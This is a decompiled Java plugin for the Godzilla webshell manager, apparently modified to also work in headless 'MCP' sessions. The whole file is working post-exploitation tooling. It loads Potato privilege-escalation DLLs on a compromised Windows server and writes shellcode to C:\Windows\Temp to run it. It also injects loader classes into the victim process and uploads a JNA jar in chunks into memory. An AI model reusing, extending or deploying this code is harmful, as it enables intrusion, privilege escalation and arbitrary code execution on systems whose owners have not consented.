//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.plugins.java;

import core.annotation.PluginAnnotation;
import core.ui.ShellManage;
import core.ui.component.dialog.GOptionPane;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import shells.plugins.PluginInfo;
import util.Log;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(
        payloadName = "JavaDynamicPayload",
        Name = "TH_TOOLS",
        DisplayName = "TH_TOOLS"
)
public class TH_TOOLS extends shells.plugins.generic.TH_TOOLS {
    private JarLoader jarLoader;
    private boolean loadJar = false;

    public TH_TOOLS() {
    }

    public String getClassName() {
        return "plugin.ShellcodeLoader";
    }

    public byte[] ExeCuteCmd() {
        try {
            byte[] result = this.runNetPe(functions.base64EncodeToString(this.Excute_cmd.getBytes()), this.getPluginByte(), 7000, this.textArea_CmdResult.getPrintStream());
            return result;
        } catch (Exception var2) {
            return var2.getMessage().getBytes();
        }
    }

    public byte[] ExeCuteShellcode() {
        try {
            if (this.shellcodeHex == null || this.shellcodeHex.length() == 0 || this.shellcodeHex.equals("")) {
                this.shellcodeHex = this.TextArea_shellcode.getText().trim();
            }

            String shellcodeb64 = functions.base64EncodeToString(functions.hexToByte(this.shellcodeHex));
            
            // Fix: GodPotato expects file path for shellcode
            String tempFilePath = "C:\\Windows\\Temp\\" + java.util.UUID.randomUUID().toString() + ".tmp";
            boolean uploadSuccess = this.payload.uploadFile(tempFilePath, shellcodeb64.getBytes());
            
            String arg;
            if (uploadSuccess) {
                arg = functions.base64EncodeToString(this.Excute_cmd.getBytes()) + " " + functions.base64EncodeToString(tempFilePath.getBytes());
            } else {
                // Fallback
                arg = functions.base64EncodeToString(this.Excute_cmd.getBytes()) + " " + shellcodeb64;
            }
            
            try {
                byte[] result = this.runNetPe(arg, this.getPluginByte(), 3000, this.textArea_CmdResult.getPrintStream());
                return result;
            } finally {
                if (uploadSuccess) {
                    this.payload.deleteFile(tempFilePath);
                }
            }
        } catch (Exception var5) {
            return var5.getMessage().getBytes();
        }
    }

    public boolean loadPlugin(String PluginName) {
        PluginInfo pluginInfos = this.SearchPluginByName(PluginName);
        Boolean PluginLoadState = pluginInfos.getLoadState();
        if (!PluginLoadState) {
            try {
                if (pluginInfos.getLoadType() == 1) {
                    byte[] binCode = this.getPluginByte();
                    PluginLoadState = this.payload.include(pluginInfos.getPluginName(), binCode);
                } else if (pluginInfos.getLoadType() == 2) {
                    PluginLoadState = true;
                }

                this.SetPluginLoadStateByName(PluginName, PluginLoadState);
            } catch (Exception var6) {
                Log.error(var6);
            }
        }

        return PluginLoadState;
    }

    protected PluginInfo[] InitPlugInfo() {
        PluginInfo[] pluginInfos = new PluginInfo[]{new PluginInfo("EfsPotato.Run", "EfsPotato", 2), new PluginInfo("BadPotato.Run", "BadPotato", 2), new PluginInfo("GodPotato.Run", "GodPotato", 2), new PluginInfo("SweetPotato.Run", "SweetPotato", 2), new PluginInfo("PrintNotifyPotato.Run", "PrintNotifyPotato", 2), new PluginInfo("McpManagementPotato.Run", "McpManagementPotato", 2)};
        return pluginInfos;
    }

    public boolean load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/ShellcodeLoader.classs");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                inputStream = this.getClass().getResourceAsStream("assets/GodzillaJna.jar");
                byte[] jar = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.loadJar(jar)) {
                    Log.log(String.format("LoadJar : %s", true));
                    this.loadState = this.payload.include("plugin.ShellcodeLoader", data);
                }
            } catch (Exception var4) {
                Log.error(var4);
                GOptionPane.showMessageDialog(this.corePanel, var4.getMessage(), "Error", 2);
            }
        }

        return this.loadState;
    }

    private boolean loadJar(byte[] jar) {
        if (this.loadJar) {
            return this.loadJar;
        } else {
            if (this.jarLoader == null) {
                try {
                    if (this.jarLoader == null) {
                        ShellManage shellManage = this.shellEntity.getFrame();
                        if (shellManage != null) {
                            this.jarLoader = (JarLoader)shellManage.getPlugin("JarLoader");
                        }
                    }
                } catch (Exception var3) {
                    Log.error(var3);
                    return false;
                }
            }

            if (this.jarLoader != null) {
                if (!(this.loadJar = this.jarLoader.hasClass("jna.sun.jna.platform.godzilla.AsmCodeLoad"))) {
                    this.loadJar = this.jarLoader.loadJar(jar);
                }
            } else {
                // MCP 无 frame 会话: 直接 include JarLoader.classs + 分片上传 mem://jar + evalFunc 加载
                this.loadJar = mcpLoadJar(jar);
            }

            return this.loadJar;
        }
    }

    /** MCP 兼容: 绕过 GUI ShellFileManager, 用 payload.bigFileUpload 分片上传 GodzillaJna.jar */
    private boolean mcpLoadJar(byte[] jar) {
        try {
            InputStream in = this.getClass().getResourceAsStream("assets/JarLoader.classs");
            if (in == null) return false;
            byte[] data = functions.readInputStream(in);
            in.close();
            if (!this.payload.include("plugin.JarLoader", data)) {
                Log.log("mcpLoadJar: include JarLoader.classs fail");
                return false;
            }
            String memFile = "mem://jar" + jar.hashCode();
            int once = this.shellEntity.getOnceBigFileUploadByteNum();
            for (int off = 0; off < jar.length; off += once) {
                byte[] chunk = java.util.Arrays.copyOfRange(jar, off, Math.min(off + once, jar.length));
                String flag = this.payload.bigFileUpload(memFile, (long)off, chunk);
                if (!"ok".equals(flag)) {
                    Log.log("mcpLoadJar: bigFileUpload fail at " + off + " flag=" + flag);
                    return false;
                }
            }
            ReqParameter rp = new ReqParameter();
            rp.add("memFileName", memFile);
            byte[] r = this.payload.evalFunc("plugin.JarLoader", "loadJarFromMemFile", rp);
            String s = this.encoding.Decoding(r);
            Log.log("mcpLoadJar: " + s);
            return "ok".equals(s);
        } catch (Exception e) {
            Log.error(e);
            return false;
        }
    }

    protected byte[] getPluginByte() {
        InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/TH_TOOLS/%s.dll", this.CurrentPlugin));
        return functions.readInputStreamAutoClose(inputStream);
    }
}
